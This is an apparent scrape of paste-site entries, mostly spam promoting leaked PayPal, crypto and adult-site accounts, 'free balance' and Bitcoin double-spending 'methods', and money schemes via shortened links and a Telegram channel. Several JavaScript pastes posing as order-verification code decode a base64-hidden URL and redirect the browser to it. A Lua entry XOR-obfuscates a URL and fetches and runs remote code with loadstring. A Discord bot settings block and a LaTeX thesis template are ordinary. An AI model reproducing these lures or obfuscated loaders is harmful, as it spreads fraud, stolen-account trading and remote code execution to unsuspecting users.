id,title,username,language,date,content
AR1g0hju,Stake Free Balance Method,luqlegal,JavaScript,Monday 5th of May 2025 06:37:54 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 10205
yb2Mue1f,EARN $900 INSTANTLY 2025⭐ GV,Ezyw,JavaScript,Monday 5th of May 2025 06:32:43 AM CDT," 
Pdf https://tinyurl.com/freshleaks

WuXRZ29TSI
"
ABfYJmzR,help,forevergaming,JavaScript,Monday 5th of May 2025 06:28:41 AM CDT,"    const getSettingsContainer = new ContainerBuilder({
        components: [
                    { 
                        type: ComponentType.TextDisplay,
                        content: (`Auction Role: ${settings.auctionRole ? `<:paidrepend:1367098048261652482> <@&${settings.auctionRole}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Blacklist Role: ${settings.blacklistRole ? `<:paidrepend:1367098048261652482> <@&${settings.blacklistRole}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Manager Role: ${settings.managerRole ? `<:paidrepend:1367098048261652482> <@&${settings.managerRole}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.Separator
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Auction Channel: ${settings.auctionChannel ? `<:paidrepend:1367098048261652482> <#${settings.auctionChannel}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Auction Category: ${settings.auctionCategory ? `<:paidrepend:1367098048261652482> <#${settings.auctionCategory}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Payout Channel: ${settings.auctionPayoutChannel ? `<:paidrepend:1367098048261652482> <#${settings.auctionPayoutChannel}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.Separator
                    },                          
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Log Channel: ${settings.auctionLogChannel ? `<:paidrepend:1367098048261652482> <#${settings.auctionLogChannel}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Mod Log Channel: ${settings.auctionModLogChannel ? `<:paidrepend:1367098048261652482> <#${settings.auctionModLogChannel}>` : `<:paidrepend:1367098048261652482> Not set`}`)
                    },
                    {
                        type: ComponentType.TextDisplay,
                        content: (`Tax Rates:\n${settings.taxRates.map(tax => `- ${tax.percent * 100}% for <@&${tax.role}>`).join('\n')}`)
                    },
                    {
                        type: ComponentType.Separator
                    },
                    {
                        type: ComponentType.ActionRowBuilder,
                        components: [
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_role`, 
                                name: 'auction_role',
                                emoji: { id: '1367111509167181865', name: 'aucto_auction', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_blacklist`, 
                                name: 'Blacklist',
                                emoji: { id: '1367111704085008506', name: 'aucto_blacklist', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_manager`, 
                                name: 'Manager',
                                emoji: { id: '1367112061204828210', name: 'aucto_manager', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_channel`, 
                                name: 'Channel',
                                emoji: { id: '1367112275147751526', name: 'aucto_channel', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                        ], 
                    },
                    {
                        type: ComponentType.ActionRowBuilder,
                        components: [
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_category`, 
                                name: 'Category',
                                emoji: { id: '1367112420841099305', name: 'aucto_category', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_payout_channel`, 
                                name: 'Payouts',
                                emoji: { id: '1367112973968998522', name: 'aucto_payout', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_log_channel`, 
                                name: 'Logs',
                                emoji: { id: '1367112766149627984', name: 'aucto_logs', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_mod_log_channel`, 
                                name: 'Mod Logs',
                                emoji: { id: '1367112766149627984', name: 'aucto_logs', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                            {
                                type: ComponentType.Button,
                                custom_id: `auction_tax_rates`, 
                                name: 'Tax Rates',
                                emoji: { id: '1367112628962594856', name: 'aucto_dmc', animated: false },
                                style: ButtonStyle.Secondary,
                            },
                        ], 
                    },
        ]
    })"
mG2EzHVA,Leaked Accounts - Fresh HitUntitled,BHOO100,JavaScript,Monday 5th of May 2025 06:25:23 AM CDT,343226 - check it out at www.tinyurl.com/hfleak
46WBrck2,Chaturbate with Tokens,navrajkhunger,JavaScript,Monday 5th of May 2025 06:22:49 AM CDT,80708 Accounts Posted On https://t.me/leakzbyeminem
sxxKmBk8,Scam Casinos and Stores,luqlegal,JavaScript,Monday 5th of May 2025 06:22:32 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 84530
VRKpnDRJ,EARN $900 INSTANTLY 2025⭐ GV,steventsai013000,JavaScript,Monday 5th of May 2025 06:22:23 AM CDT," 
Pdf https://tinyurl.com/freshleaks

QlRRBSVLdY
"
bP76pmuG,Market.js,WassupDog45,JavaScript,Monday 5th of May 2025 06:22:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24654/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rY2nyEss,EARN $900 INSTANTLY 2025 95,nashamuktikendraaa,JavaScript,Monday 5th of May 2025 06:12:41 AM CDT," 
Pdf https://tinyurl.com/freshleaks

EUut0Q7jmC
"
LTxAx4i6,Crypto Accounts,navrajkhunger,JavaScript,Monday 5th of May 2025 06:07:27 AM CDT,58902 Accounts Posted On https://t.me/leakzbyeminem
sS5yjFSd,Doublespending using Vanity Wallet,luqlegal,JavaScript,Monday 5th of May 2025 06:07:11 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 82032
evUEbjD6,Untitled,WassupDog45,JavaScript,Monday 5th of May 2025 06:06:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45844/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rsZHFTtz,dataNone,TestGuy1,JSON,Monday 5th of May 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8639e9917431453b714844b1e4d052335a06a873d3746c11467c61563d74b3ef19bfb337ce83bb6a2295fa64d483765df7ac87a604c797ee8fb4774e83f2b394bf2444233216667b34fca9d92dea3f57cae63d9f7654ae5d398813299e597f3c7ff753608e5419ed93bc788b7674035c5db7c96fabf7a9ad11962cb19306c581',
  otherdata: [
    'cf672c209d3ab326a023e1469c0bbec4',
    '520b769cedf0e3c68c203f60d4ecf873',
    'f8bdf84100360c673eb7de3d193879ac',
    'f614f2ae256f680c59ee4f1d77e2a6e7',
    '41d6f470355def631c3b96aae093b6a0',
    '8bc587bcde09c1faa8063073c0613df3',
    'b4b775096c54f5852187bf36849a4929',
    '92377e61c63644201e73f2bbc4d2cad8'
  ]
}"
mqffuj6P,PayPal with Balance,navrajkhunger,JavaScript,Monday 5th of May 2025 05:52:03 AM CDT,15071 Accounts Posted On https://t.me/leakzbyeminem
nGpy6rY3,Abuse RBF in BTC transactions,luqlegal,JavaScript,Monday 5th of May 2025 05:51:43 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 18954
1SQvv19X,Untitled,navrajkhunger,JavaScript,Monday 5th of May 2025 05:51:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53162/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3ZNty3eu,Зафшированный в виде ссылки скрипт на Guess Italian Brainrot or Die,Viper4109,Lua,Monday 5th of May 2025 05:39:03 AM CDT,"local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7(""\217\215\207\53\245\225\136\81\193\194\200\49\227\185\206\16\159\192\212\40\169\169\198\9\158\200\201\115\179\181\194\70\255"",""\126\177\163\187\69\134\219\167"")))();"
b4XHBjAG,Stake Free Balance Method,luqlegal,JavaScript,Monday 5th of May 2025 05:36:22 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 74638
ndYHzD4A,Crypto Accounts,iLoveToWatch,JavaScript,Monday 5th of May 2025 05:36:21 AM CDT,16593 Accounts Posted On https://t.me/leakzbyeminem
xtZexZh1,Products.js,navrajkhunger,JavaScript,Monday 5th of May 2025 05:36:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43659/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iDFdCk5D,Template licenta latex - FII,CosminVarlan,Latex,Monday 5th of May 2025 05:27:05 AM CDT,"\documentclass[12pt]{report}

% includes
\usepackage{geometry}           % page size
\usepackage[utf8]{inputenc}     % encoding
\usepackage{palatino}           % font
\usepackage[romanian]{babel}    % language
\usepackage{graphicx}           % images
\usepackage{indentfirst}        % indentation
\usepackage[nottoc]{tocbibind}  % table of contents style
\usepackage[unicode]{hyperref}  % references from the table of contents

% includes options
\geometry{  a4paper,            % scientific thesis standard
            left=3cm,
            right=2cm,
            top=2cm,
            bottom=2cm,
 }
\graphicspath{{images/}}        % path where the images are located
\setlength{\parindent}{1cm}     % paragraph indentation

% other options
\linespread{1.5}                % space between lines
\renewcommand*\contentsname{Cuprins}    % table of contents name

% the document content
\begin{document}
    % macros (global)
    \input{front/macros}
    
    % front-matter
    \pagenumbering{gobble}
    
    \input{front/cover}
    \input{front/titlepage}
    \input{front/declaration1}
    \input{front/declaration2}
    
    % table of contents
    \tableofcontents
    
    % chapters
    \setcounter{page}{1}
    \pagenumbering{arabic}
    
    \input{chapters/motivation}
    \input{chapters/introduction}
    
    \input{chapters/chapter1}
    \input{chapters/chapter2}
    \input{chapters/chapter3}
    
    \input{chapters/conclusions}
    \input{chapters/bibliography}
\end{document}"
7PxgjMUy,PayPal with Balance,iLoveToWatch,JavaScript,Monday 5th of May 2025 05:21:00 AM CDT,36131 Accounts Posted On https://t.me/leakzbyeminem
L4DuWxAb,Scam Casinos and Stores,luqlegal,JavaScript,Monday 5th of May 2025 05:20:59 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 80590
ikzX3LWp,Order.js,navrajkhunger,JavaScript,Monday 5th of May 2025 05:20:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41728/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EEmPHn0Z,Leaked Accounts - Fresh Hits,iLoveToWatch,JavaScript,Monday 5th of May 2025 05:05:38 AM CDT,71074 Accounts Posted On https://t.me/leakzbyeminem
